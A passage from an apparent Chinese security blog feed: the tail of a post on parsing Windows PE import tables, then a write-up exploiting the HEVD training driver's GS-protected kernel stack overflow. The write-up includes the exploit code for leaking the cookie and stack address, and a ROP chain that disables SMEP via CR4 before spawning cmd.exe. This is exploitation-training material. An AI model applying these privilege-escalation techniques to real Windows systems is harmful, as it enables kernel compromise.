class="line">    DWORD   VirtualAddress;</span><br><span class="line">    DWORD   SizeOfRawData;</span><br><span class="line">    DWORD   PointerToRawData;</span><br><span class="line">    DWORD   PointerToRelocations;</span><br><span class="line">    DWORD   PointerToLinenumbers;</span><br><span class="line">    WORD    NumberOfRelocations;</span><br><span class="line">    WORD    NumberOfLinenumbers;</span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">FilePE::bGetSectionList</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;FileContent.<span class="built_in">length</span>() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;File content is zero&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pHeaderNT == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;NT head not initialize&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD SectionNum = <span class="keyword">this</span>-&gt;pHeaderNT-&gt;FileHeader.NumberOfSections;</span><br><span class="line"><span class="keyword">this</span>-&gt;SecNum = SectionNum;</span><br><span class="line"><span class="keyword">this</span>-&gt;SectionList = (PIMAGE_SECTION_HEADER*)<span class="built_in">malloc</span>((SectionNum + <span class="number">1</span>) * <span class="built_in">sizeof</span>(PIMAGE_SECTION_HEADER));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;SectionList == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;Allcate section list memory failed\n&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; SectionNum; i++)</span><br><span class="line">&#123;</span><br><span class="line">SectionList[i] = <span class="built_in">PIMAGE_SECTION_HEADER</span>(</span><br><span class="line">&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;pHeaderDOS-&gt;e_lfanew </span><br><span class="line">+ <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + i * <span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="iat表"><a class="markdownIt-Anchor" href="#iat表"></a> IAT表</h1><h2 id="i-如何找到文件的iat表"><a class="markdownIt-Anchor" href="#i-如何找到文件的iat表"></a> I. 如何找到文件的IAT表</h2><p>IAT叫Import Address Table，当我们的程序需要外部库的函数时，就会从这里开始调用</p><p>IAT表的地址并不在任何头中，不过我们之前分析<code>Directory</code>的时候就发现会有一个<code>IMAGE_DIRECTORY_ENTRY_IAT</code>，<strong>但它不是导入表</strong>，真正的IAT描述：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pHeaderNT-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]</span><br></pre></td></tr></table></figure><p>按道理来说<code>VirtualAddress+ImageBase</code>就是运行起来的地址，这里我没有加上</p><p>突然想起来我们在分析节表的时候也存在类似的 基地址+偏移</p><p>对于这个结构体之前的只能用这块儿的目录</p><p><img src="https://img.joe1sn.top/uploads/big/64d79e16f1f82549728ea2485f24e2ae.png" alt="image-20240225200226287" /></p><p>对应文件中地址为<code>28fc-2000+1400 = 1cfc</code></p><p><img src="https://img.joe1sn.top/uploads/big/6f62574a7f77ff1f01ff30421a8debb9.png" alt="image-20240225201254439" /></p><p>有点意思，查阅资料发现对应的结构体：<code>_IMAGE_IMPORT_DESCRIPTOR</code>，MSDN中并没有对应说明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp; </span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br><span class="line"><span class="keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure><p>有个问题就是这块地址是运行时写入IAT相关信息，我们的静态分析到这一步就算断了</p><p>这里我设计了一个<code>BOOL bGetIAT();</code>函数，直接去读程序的内存，为了简单，就先关闭ASLR</p><p><img src="https://img.joe1sn.top/uploads/big/f9be67365195df36d263aa69506b58df.png" alt="image-20240225191521687" /></p><p><img src="https://img.joe1sn.top/uploads/big/c40d6d7e9614f013dab24ba69eca45f2.png" alt="image-20240225205332584" /></p><p>已经成功读取一个信息，接下来办法全部找出来，自然想到的就是Name为0就退出，但是由于总数不知道，所以需要一个动态容器，我用的<code>vector</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vector&lt;PIMAGE_IMPORT_DESCRIPTOR&gt; pIATList;</span><br></pre></td></tr></table></figure><p>按照一样的方法全部得到后，再次尝试在运行中读取</p><p><img src="https://img.joe1sn.top/uploads/big/9a5ad9c077dbdbd474c55403306704af.png" alt="image-20240225211740589" /></p><p>但是很多PE分析工具静态也能看得到，利用的是<code>RVA-&gt;RAW</code>的转换</p><p><code>2d52-2000+1400=2152</code></p><p><img src="https://img.joe1sn.top/uploads/big/e35d09a9ba26e92fb594200b44f809eb.png" alt="image-20240225212317511" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FilePE::PrintIATStatic</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;pIATList.<span class="built_in">size</span>() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Error</span>(<span class="string">&quot;IAT List empty&quot;</span>, DEBUG);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD VA = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>-&gt;pIATList.<span class="built_in">size</span>(); i++)</span><br><span class="line">&#123;</span><br><span class="line">VA = <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(<span class="keyword">this</span>-&gt;pIATList[i]-&gt;Name);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;DLL : &quot;</span> &lt;&lt; &amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + VA &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/832de7fba954f0b7afb7109fe59bf175.png" alt="image-20240225213837289" /></p><h2 id="ii-找到导入函数"><a class="markdownIt-Anchor" href="#ii-找到导入函数"></a> II. 找到导入函数</h2><p>通过<code>OriginalFirstThunk</code>，基本就是<code>OriginalFirstThunk</code>进行转化找到RAW，RAW地方的地址再转为RAW就找到了，最终的位置是一个<code>_IMAGE_IMPORT_BY_NAME</code>结构体</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_IMPORT_BY_NAME</span> &#123;</span><br><span class="line">    WORD    Hint;</span><br><span class="line">    CHAR   Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/61868899fc8bd10cb177cd0349be419c.png" alt="image-20240225215424856" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FilePE::PrintFunction</span><span class="params">(PIMAGE_IMPORT_DESCRIPTOR pIAT)</span> </span>&#123;</span><br><span class="line">DWORD64 VA = *<span class="built_in">PDWORD64</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(pIAT-&gt;OriginalFirstThunk));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">1</span>; VA != <span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME IatName = <span class="built_in">PIMAGE_IMPORT_BY_NAME</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(VA));</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;    Function &quot;</span> &lt;&lt; IatName-&gt;Name &lt;&lt; endl;</span><br><span class="line">VA = *<span class="built_in">PDWORD64</span>(&amp;<span class="keyword">this</span>-&gt;FileContent[<span class="number">0</span>] + <span class="keyword">this</span>-&gt;<span class="built_in">dwVAToRaw</span>(pIAT-&gt;OriginalFirstThunk) + i * <span class="built_in">sizeof</span>(DWORD64));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/medium/2c0ece8077ee8d172ae716ebdc5d5b77.png" alt="image-20240225223834556" /></p><h1 id="找到入口函数"><a class="markdownIt-Anchor" href="#找到入口函数"></a> 找到入口函数</h1><p>很简单，在上面的<code>nt-&gt;option_header.AddressOfEntryPoint</code>里面，可以直接ImageBase+AddressOfEntryPoint，二进制数据都对的上</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近代码能力飞速提升，顺便复习一下&lt;/p&gt;</summary>
    
    
    
    <category term="program" scheme="https://joe1sn.eu.org/categories/program/"/>
    
    
    <category term="malware" scheme="https://joe1sn.eu.org/tags/malware/"/>
    
    <category term="C" scheme="https://joe1sn.eu.org/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-内核栈溢出GS保护及绕过</title>
    <link href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/"/>
    <id>https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</id>
    <published>2024-02-24T03:10:43.000Z</published>
    <updated>2024-02-24T06:02:06.548Z</updated>
    
    <content type="html"><![CDATA[<p>HEVD中的栈溢出加上GS保护<br />还有一个知识点就是windows内核栈地址泄露</p><span id="more"></span><p>函数功能</p><p><img src="https://img.joe1sn.top/uploads/big/a1743db93e122898948550a845f7d04f.png" alt="image-20240124203451123" /></p><p>在上三篇中讲的很清楚了，这里我关闭了KVAS</p><p><img src="https://img.joe1sn.top/uploads/big/21407e450615457821bd83e162b53ecc.png" alt="image-20240124203542280" /></p><p>又是一段经典的栈溢出，但是有了内核的GS保护</p><h1 id="编写exploit"><a class="markdownIt-Anchor" href="#编写exploit"></a> 编写exploit</h1><p>这里就不得不提到Windows中一种Cannary的绕过方式了，通过try except的Handler进行绕过，很遗憾handler只在32位程序中才保存在栈上</p><p>查阅资料</p><p><a href="https://paper.seebug.org/2017/#22">https://paper.seebug.org/2017/#22</a></p><p><a href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html</a></p><p>cookie值是存储在<code>_data</code>段的第一个</p><p><img src="https://img.joe1sn.top/uploads/big/1c6b200d43a1bc05250cfd066d6c2991.png" alt="image-20240124215049718" /></p><p>函数检查的部分，有一个异或</p><p><img src="https://img.joe1sn.top/uploads/big/fb17ff5c2760ddac222db2dda25f7b7f.png" alt="image-20240124215249257" /></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffff8788`21979540  00000000`00000000</span><br><span class="line">ffff8788`21979548  ffffc186`261f98f0</span><br><span class="line">ffff8788`21979550  ffffc186`269c86b0</span><br><span class="line">ffff8788`21979558  00000000`80000004</span><br><span class="line">ffff8788`21979560  00000000`00000000</span><br><span class="line">ffff8788`21979568  fffff804`2a4d66e5 HEVD!TriggerBufferOverflowStackGS+0x5 [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70]</span><br><span class="line">ffff8788`21979570  00000000`00000000</span><br><span class="line">ffff8788`21979578  00000000`00000003</span><br><span class="line">ffff8788`21979580  54535f57`4f4c4652</span><br><span class="line">ffff8788`21979588  ffffc186`1f93206c</span><br><span class="line">ffff8788`21979590  00000000`00000000</span><br><span class="line">ffff8788`21979598  00000000`00000000</span><br><span class="line">ffff8788`219795a0  00000000`00000000</span><br><span class="line">ffff8788`219795a8  00000000`00000000</span><br><span class="line">ffff8788`219795b0  ffff8788`219796a0</span><br><span class="line">ffff8788`219795b8  00000000`00000000</span><br><span class="line"></span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=0000ad1068899811</span><br><span class="line"></span><br><span class="line">1: kd&gt; s rsp L1000 07 20 22</span><br><span class="line">ffff8788`219797e8  07 20 22 00 00 00 00 00-20 0d 07 27 86 c1 ff ff  . &quot;..... ..&#x27;....</span><br><span class="line">ffff8788`21979988  07 20 22 00 86 c1 ff ff-00 00 00 00 00 00 00 00  . &quot;.............</span><br><span class="line">ffff8788`21979a48  07 20 22 00 ff ff ff ff-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">ffff8788`21979ab8  07 20 22 00 00 00 00 00-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">1: kd&gt; ? ffff8788`219797e8-rsp</span><br><span class="line">Evaluate expression: 680 = 00000000`000002a8</span><br></pre></td></tr></table></figure><ol><li><p>利用之前的<code>ulGetBase</code>得到<code>HEVD.sys</code>的基地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dqs  0xfffff80522fe0000+3000</span><br><span class="line">fffff805`22fe3000  00006fd9`604347b3</span><br><span class="line">fffff805`22fe3008  ffff9026`9fbcb84c</span><br></pre></td></tr></table></figure><p>再下断点看看是不是为这个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerBufferOverflowStackGS+0x1b:</span><br><span class="line">fffff805`230666fb 4833c4          xor     rax,rsp</span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=00006fd9604347b3</span><br></pre></td></tr></table></figure><p>还真是，那么访问<code>base+3000</code>就可以得<code>cookie</code>值</p></li><li><p>如何读取？这个还真没办法，只能利用另外一个漏洞<code>HEVD_IOCTL_ARBITRARY_WRITE</code>，将该值修改为我们自己的值，也可以设置<code>Ring3ToKernel</code>中的一个地址的值为待写入的地方，然后利用这个漏洞将<code>cookie</code>写入</p></li><li><p><code>key</code>值位于<code>rsp</code>上，利用<code>NtQuerySystemInformation</code>中的<code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code>可以得到，</p><p>但是后面又看不了了，这个时候我想了下，一个exp可以看到另外一个exp的栈地址，但是查看自身的时候已经不在上面了，或许改为线程执行可以？</p><p><img src="https://img.joe1sn.top/uploads/big/afed146baf184820b89d608a1d389bea.png" alt="image-20240224093858858" /></p><p>就用这种方法试试看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Found Ring3ToKernel.exe</span><br><span class="line">Stack base 0xffffef8360dce000   Stack limit 0xffffef8360dc8000</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2bbb268241ad0b8cb84e109543a4d1c3.png" alt="image-20240224101543720" /></p><p>偏移是一个定值，再回忆一下之前的cookie生成算法就能得cookie了<br />但是有个小问题，合成cookie时，rsp值变化了</p><p><img src="https://img.joe1sn.top/uploads/big/a8a2278b4ba72209556e3640b3b8b4ff.png" alt="image-20240224103819644" /><br />考虑到push和sub所以：rsp = stack base - 0x868 - 0x258</p><p>此实，key值为：0000768c469d2a88，rsp = ffffef83619aa798，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x0000768c469d2a88^(0xffffef83619aa798-0x258))</span><br><span class="line">&#x27;0xffff990f27078fc8&#x27;</span><br></pre></td></tr></table></figure><p>得到cookie值为<code>0xffff990f27078fc8</code></p><p><img src="https://img.joe1sn.top/uploads/big/708fcb6fd0aa1439e655314f5cb7e5ad.png" alt="image-20240224103938531" /></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br></pre></td></tr></table></figure></li><li><p>然后就是经典常规栈溢出+ROP打法</p></li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line"><span class="built_in">ulGetStackLimit</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">funcaddr rsp = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf_s</span>(<span class="string">&quot;%llx&quot;</span>, &amp;rsp);</span><br><span class="line">rsp -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line">rsp ^= value;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line"><span class="comment">//RtlFillMemory(stackspace, 0x238, &#x27;A&#x27;);</span></span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">size = <span class="number">0x258</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/04085ad653545f1461b7b9f567e10b46.png" alt="image-20240224121139780" /></p><h1 id="微调exploit"><a class="markdownIt-Anchor" href="#微调exploit"></a> 微调exploit</h1><ul><li><p>shellcode得仔细调整rsp值</p><p>很简单，和最开的是栈溢出一样，直接一个push两个ret，让rsp+0x28变成了rsp+0x10</p></li><li><p>还有就是泄露内核栈地址的时候得稳定，让其包含当前进程</p><p>我的解决方法简单粗暴，多线程和直接加<code> 